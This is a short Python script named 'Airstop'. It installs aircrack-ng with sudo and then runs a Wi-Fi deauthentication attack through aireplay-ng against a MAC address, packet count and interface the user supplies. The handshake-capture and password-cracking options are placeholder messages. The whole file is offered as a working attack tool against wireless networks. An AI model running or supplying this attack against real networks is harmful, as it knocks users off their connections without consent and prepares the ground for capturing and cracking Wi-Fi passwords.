import shutil
import time 
import subprocess
from pyfiglet import Figlet

f = Figlet(font="slant")
print(f.renderText("Airstop"))
time.sleep(1)

print ("Starting Airstop")
time.sleep(1)
print("Airstop is checking if all tools are installed...")
time.sleep(0.5)
print("...")
time.sleep(2)
print("Air stop is installing aircrack-ng...")

subprocess.run(["sudo", "apt-get", "install", "aircrack-ng", "-y"])

if shutil.which("aircrack-ng"):
    print("aircrack-ng is installed")
else:
    print("aircrack-ng is NOT installed")

attack=input("What attack do you want to use? (1-deauth,2-handshake,3-passwd cracking): ")
if attack == "1":
    print("Starting deauth attack...")
    time.sleep(1)
    print("Please enter the target's MAC address: ")
    target_mac = input()
    print("Please enter the number of deauth packets to send: ")
    num_packets = input()
    print("select interface: ")
    interface = input()
    print("Starting deauth attack on " + target_mac + " with " + num_packets + " packets...")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", num_packets, "-a", target_mac, interface])

elif attack == "2":    
    print("This version 1.0.1 only supports deauth attack, handshake and password cracking will be added in future updates.")

elif attack == "3":
    print("This version 1.0.1 only supports deauth attack, handshake and password cracking will be added in future updates.")
else:    
    print("Invalid option, please select 1, 2 or 3.")
